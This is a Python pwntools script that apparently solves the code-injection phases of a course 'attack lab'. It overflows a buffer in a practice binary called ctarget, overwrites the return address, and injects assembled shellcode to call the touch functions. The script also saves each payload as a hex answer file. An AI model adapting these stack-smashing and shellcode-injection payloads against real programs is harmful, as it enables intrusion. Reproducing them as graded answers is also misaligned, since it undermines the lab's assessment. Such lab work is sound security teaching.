from pwn import *
import keystone

def save_answer(answer: bytes, filename: str):
    # Two bytes and a space
    with open(filename, 'w') as f:
        for i in range(0, len(answer), 8):
            chunk = answer[i:i+8]
            hex_line = ' '.join(f'{b:02x}' for b in chunk)
            f.write(hex_line + '\n')

def touch1():
    payload = b'A' * 0x38
    payload += p64(0x808a18)  # Address of touch1 function
    # Start the process and send the payload
    save_answer(payload, 'src/ctarget01.txt')
    p = process('./ctarget')
    p.sendline(payload)
    p.interactive()
    p.close()
    return

def touch2():
    KS = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_64)
    KS.syntax = keystone.KS_OPT_SYNTAX_ATT
    asm = """
movq $0x2ce1a21a,%rdi
pushq $0x808a46
ret
        """
    encoding, count = KS.asm(asm)
    shellcode = bytes(encoding)
    print("Shellcode length:")
    print(len(shellcode))
    print("Shellcode:")
    print(shellcode)
    payload = shellcode
    payload += b'A' * (0x38 - len(shellcode))
    payload += p64(0x55614678)  # Address of buffer -> %rsp
    save_answer(payload, 'src/ctarget02.txt')
    
    # Start the process and send the payload
    
    p = process('./ctarget')
    p.sendline(payload)
    p.interactive()
    p.close()
    return

def touch3():
    KS = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_64)
    KS.syntax = keystone.KS_OPT_SYNTAX_ATT
    asm = """
movq $0x556146B8,%rdi
pushq $0x808b5d
ret
        """
    encoding, count = KS.asm(asm)
    shellcode = bytes(encoding)
    print("Shellcode length:")
    print(len(shellcode))
    print("Shellcode:")
    print(shellcode)
    payload = shellcode
    payload += b'A' * (0x38 - len(shellcode))
    payload += p64(0x55614678)  # Address of buffer -> %rsp
    payload += b'2ce1a21a'  # Argument for touch3
    save_answer(payload, 'src/ctarget03.txt')
    
    # Start the process and send the payload
    
    p = process('./ctarget')
    p.sendline(payload)
    p.interactive()
    p.close()
    return

if __name__ == "__main__":
    touch1()
    touch2()
    touch3()